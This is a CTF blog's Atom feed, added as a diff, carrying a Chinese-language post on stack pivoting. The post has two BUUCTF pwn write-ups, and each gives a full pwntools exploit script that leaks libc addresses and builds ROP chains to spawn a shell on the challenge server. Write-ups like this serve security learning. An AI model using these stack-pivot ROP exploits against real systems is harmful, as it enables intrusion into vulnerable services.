@@ -1,0 +1,131 @@
+<?xml version="1.0"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>http://niyah.cn</id>
+    <title>-NIYAH- • Posts by &#34;栈迁移&#34; tag</title>
+    <link href="http://niyah.cn" />
+    <updated>2021-01-25T10:10:27.000Z</updated>
+    <category term="CTF" />
+    <category term="PWN" />
+    <category term="格式化字符串" />
+    <category term="堆" />
+    <category term="BUUCTF" />
+    <category term="DASCTF" />
+    <category term="IDA" />
+    <category term="IO_FILE" />
+    <category term="栈" />
+    <category term="pwnable" />
+    <category term="rop" />
+    <category term="UAF" />
+    <category term="shellcode" />
+    <category term="PWNHUB" />
+    <category term="kernel" />
+    <category term="C语言" />
+    <category term="栈迁移" />
+    <category term="unlink" />
+    <category term="长安杯" />
+    <category term="天翼杯" />
+    <category term="Das" />
+    <category term="祥云杯" />
+    <category term="LLVM" />
+    <entry>
+        <id>http://niyah.cn/CTF/%E6%A0%88%E8%BF%81%E7%A7%BB/</id>
+        <title>栈迁移</title>
+        <link rel="alternate" href="http://niyah.cn/CTF/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
+        <content type="html">&lt;h2 id=&#34;spwn栈-bss&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#spwn栈-bss&#34;&gt;#&lt;/a&gt; spwn（栈 -&amp;gt;bss）&lt;/h2&gt;
+&lt;p&gt;本题考察的是栈迁移&lt;/p&gt;
+&lt;p&gt;进入 IDA 进行分析，我们可以看到本题为我们提供了两个输入：&lt;/p&gt;
+&lt;p&gt;第一次输入我们可以把数据写入到程序的 bss 段；&lt;/p&gt;
+&lt;p&gt;第二次输入我们可以造成溢出，但是只能 8 个字节，做 rop 链显然是太短了，但好在程序之中有 leave 片段&lt;/p&gt;
+&lt;p&gt;在 32 位汇编下相当于:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;mov esp,ebp;&lt;br&gt;
+pop ebp&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;将栈顶指针 esp 指向帧指针 ebp，然后 pop 备份的原帧指针到 ebp，实现栈迁移&lt;/p&gt;
+&lt;p&gt;由于我们的程序是 32 位程序，我们可以覆盖把 ebp 覆盖成 bss 段地址之后执行 leave 指令，这样我们 ebp 便指向了 bss 段，我们便可以执行我们第一次输入到 bss 段的内容；&lt;/p&gt;
+&lt;p&gt;之后是正常的 rop 过程。&lt;/p&gt;
+&lt;p&gt;完整流程如下：&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;1. 第一轮的第一次输入把泄露函数地址的 rop 链写入 bss 段；&lt;/p&gt;
+&lt;p&gt;2. 第一轮的第二次输入进行栈迁移至 bss 段将函数地址泄露；&lt;/p&gt;
+&lt;p&gt;3. 跳转到 main 进行第二轮执行；&lt;/p&gt;
+&lt;p&gt;3. 查找 libc 库；&lt;/p&gt;
+&lt;p&gt;4. 使用 system 构造新的 rop 链；&lt;/p&gt;
+&lt;p&gt;5. 第二轮的第一次输入输入新的 rop 链；&lt;/p&gt;
+&lt;p&gt;6. 第一轮的第二次输入进行栈迁移至 bss 来 getshell。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre class=&#34;language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#coding=utf-8&lt;/span&gt;
+&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;
+&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; LibcSearcher
+
+context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log_level&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;debug&#34;&lt;/span&gt;
+
+p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; remote &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;node3.buuoj.cn&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;28070&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+write_plt &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x8048380&lt;/span&gt;
+write_got &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x804A01C&lt;/span&gt;
+mian_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x8048513&lt;/span&gt; 
+leave_ret&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x08048511&lt;/span&gt;    &lt;span class=&#34;token comment&#34;&gt;#leave 汇编片段leave指令是将栈顶指针esp指向帧指针ebp，然后pop备份的原帧指针到%ebp，实现栈迁移&lt;/span&gt;
+bss_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x804A300&lt;/span&gt;
+
+payload1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;write_plt&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mian_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;write_got&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+payload2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x18&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;bss_addr&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;leave_ret&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;   &lt;span class=&#34;token comment&#34;&gt;#第二个为ebp，因为有pop ebp的缘故，会将栈顶指针esp - 4，将ebp覆盖为想要调整到的位置需-4&lt;/span&gt;
+
+p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;name?&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;say?&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+write_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; u32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;write_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+libc &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; LibcSearcher&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;write_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+libcbase &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; write_addr &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+sys_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; libcbase &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;system&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+binsh_addr &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; libcbase &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;str_bin_sh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+payload3 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;sys_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;mian_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;binsh_addr&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;name?&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload3&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;say?&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+&lt;span class=&#34;token comment&#34;&gt;#这题用sendline不行，原因是sendline会发送一个回车符&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;ciscn_2019_es_2栈-栈&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ciscn_2019_es_2栈-栈&#34;&gt;#&lt;/a&gt; ciscn_2019_es_2（栈 -&amp;gt; 栈）&lt;/h2&gt;
+&lt;p&gt;同样是一道栈迁移题目，根据 IDA 打开来看可以发现我们的输入距离 ebp 位置有 0x28 个字节，我们可以填入 0x28 个字节让接下来的 printf 函数直接打印出 ebp 的值。&lt;/p&gt;
+&lt;p&gt;接下来我们可以动调一下来看看我们 ebp 的值距离我们输入字符串位置的偏移是多少，可以发现是 0x38，那么我们就能知道我们输入的地址为 ebp 的值减去 0x38&lt;/p&gt;
+&lt;p&gt;接下来是第二次输入，需要知道第二次输入同样是 0x30 个字符：本题目中没有现成的’/bin/sh’字符，我们需要构造一个指向我们输入的’/bin/sh’地址的值来作为 system 函数的参数，填满 0x28 个字节后覆盖 ebp 指向我们的输入地址，之后是 leave 栈迁移 getshell&lt;/p&gt;
+&lt;pre class=&#34;language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;#coding=utf-8&lt;/span&gt;
+&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;
+context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log_level&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;
+
+&lt;span class=&#34;token comment&#34;&gt;#p=process(&#39;ciscn_2019_es_2&#39;)&lt;/span&gt;
+
+p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;node3.buuoj.cn&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;26666&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+leave &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x080484b8&lt;/span&gt;
+system_plt&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x8048400&lt;/span&gt; 
+
+payload1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x20&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;abcdefgh&#39;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;#完全覆盖至printf输出栈上，输出ebp&lt;/span&gt;
+
+&lt;span class=&#34;token comment&#34;&gt;#这里esp距离ebp有0x28个字节我们直接输入0x28个来打印ebp算出偏移&lt;/span&gt;
+&lt;span class=&#34;token comment&#34;&gt;#刚好能输出ebp就不要多想，直接覆盖0x28就完事&lt;/span&gt;
+
+p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;abcdefgh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+s_adder &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; u32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x38&lt;/span&gt;
+
+&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s_adder&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+payload2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;bbbb&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;system_plt&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;cccc&#39;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s_adder &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;/bin/sh\x00&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x28&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s_adder&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;leave&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;send&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
+
+p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+</content>
+        <category term="PWN" />
+        <category term="BUUCTF" />
+        <category term="栈迁移" />
+        <updated>2021-01-25T10:10:27.000Z</updated>
+    </entry>
+</feed>
